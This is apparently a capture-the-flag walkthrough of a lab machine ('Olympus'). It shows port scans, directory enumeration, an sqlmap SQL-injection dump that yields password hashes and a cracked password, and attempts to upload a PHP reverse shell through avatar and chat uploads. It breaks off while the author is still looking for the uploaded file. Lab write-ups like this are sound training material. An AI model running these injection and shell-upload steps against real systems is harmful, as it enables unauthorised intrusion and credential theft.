
nmap
```
└─$ sudo nmap -Pn -sV 10.10.249.17
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 15:33 PDT
Nmap scan report for 10.10.249.17
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.58 seconds
```

On the site I found
`If support is needed, please contact root@the-it-department. The old version of the website is still accessible on this domain.`

gobuster output
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -u olympus.thm
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/07/20 15:49:03 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
/index.php            (Status: 200) [Size: 1948]                                    
/index.php            (Status: 200) [Size: 1948]                                    
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]                                     
/server-status        (Status: 403) [Size: 276]                                     
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/] 
```

I found a ~/webmaster page.
```
This is the first version of the Olympus website. 
It should become a platform for each and everyone of you to express their needs and desires. 
Humans should not be allowed to visit it. 

Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.
As I remind you, we have a wordlist of forbidden password that you should use.
Please update your passwords.
```

Looks like there is a password list somewhere. I'll enumerate more and see what I find
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -u olympus.thm/~webmaster===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/~webmaster
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/07/20 16:11:39 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]                                                                                                               
/.htaccess.txt        (Status: 403) [Size: 276]                                                                                                               
/.htpasswd.txt        (Status: 403) [Size: 276]                                                                                                               
/admin                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/admin/]                                                                    
/category.php         (Status: 200) [Size: 6650]                                                                                                              
/css                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/css/]                                                                      
/fonts                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/fonts/]                                                                    
/img                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/img/]                                                                      
/includes             (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/includes/]                                                                 
/index.php            (Status: 200) [Size: 9386]                                                                                                              
/index.php            (Status: 200) [Size: 9386]                                                                                                              
/js                   (Status: 301) [Size: 318] [--> http://olympus.thm/~webmaster/js/]                                                                       
/LICENSE              (Status: 200) [Size: 1070]                                             
/search.php           (Status: 200) [Size: 6621] 
```

I saw that the category.php has a `cat_id` parameter. I ran sqlmap to see what I found find.
```
sqlmap --dbms=MySql --dump -u http://olympus.thm/~webmaster/category.php?cat_id=1


dt,msg,file,uname
2022-04-05,Attached : prometheus_password.txt,47c3210d51761686f3af40a875eeaaea.txt,prometheus
2022-04-05,"This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...",<blank>,prometheus
2022-04-06,I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it.,<blank>,zeus


└─$ cat comments.csv
comment_id,comment_post_id,comment_date,comment_email,comment_author,comment_status,comment_content
1,2,2022-05-03,<blank>,prometheus,approved,"Heyyy ! You've done a damn good but unsecured job ^^\r\n\r\nI've patched a few things on my way, but I managed to hack my self into the olympus !\r\n\r\ncheerio ! \r\n=P"

└─$ cat users.csv
user_id,randsalt,user_name,user_role,user_email,user_image,user_lastname,user_password,user_firstname
3,<blank>,prometheus,User,prometheus@olympus.thm,<blank>,<blank>,$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C,prometheus
6,dgas,root,Admin,root@chat.olympus.thm,<blank>,<blank>,$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK,root
7,dgas,zeus,User,zeus@chat.olympus.thm,<blank>,<blank>,$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC,zeus

```
creds found with hashcat
```
prometheus:summertime
```

I logged in as prometheus and used searchsploit to find an arbitrary file upload exploit.
`http://olympus.thm/~webmaster/admin/users.php?source=add_user` where I was able to add a user and set a php reverse shell file as the new user's avatar icon...and it doesn't work.
I couldn't find an uploads folder or anything. I checked my sqlmap output and saw `zeus@chat.olympus.thm`. I missed a subdomain!!!

I went to this subdomain and found a login page. I logged in with the same creds and found a chat page. You can upload files so I uploaded my reverse-shell.php file.
But...I couldn't access it. I decided to run gobuster against this new subdomain to see what I can find.
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -u chat.olympus.thm
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.olympus.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/07/20 17:25:03 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/.htaccess.html       (Status: 403) [Size: 281]
/.htpasswd.php        (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.hta.php             (Status: 403) [Size: 281]
/.htpasswd.txt        (Status: 403) [Size: 281]
/.htaccess.php        (Status: 403) [Size: 281]
/.hta.txt             (Status: 403) [Size: 281]
/.htpasswd.html       (Status: 403) [Size: 281]
/.hta.html            (Status: 403) [Size: 281]
/.hta                 (Status: 403) [Size: 281]
/config.php           (Status: 200) [Size: 0]  
/home.php             (Status: 302) [Size: 0] [--> login.php]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
/login.php            (Status: 200) [Size: 1577]                                         
/logout.php           (Status: 302) [Size: 0] [--> login.php]                            
/phpmyadmin           (Status: 403) [Size: 281]                                          
/server-status        (Status: 403) [Size: 281]                                          
/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]    
/upload.php           (Status: 200) [Size: 112]                                          
/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/] 
```

Hey hey! /uploads let's check it out! Anddd....Nothing is happening. 
There is a reference to `prometheus_password.txt,47c3210d51761686f3af40a875eeaaea.txt,prometheus` from the sqlmap output.
It looks like the filenames are changed to make it difficult to find them.
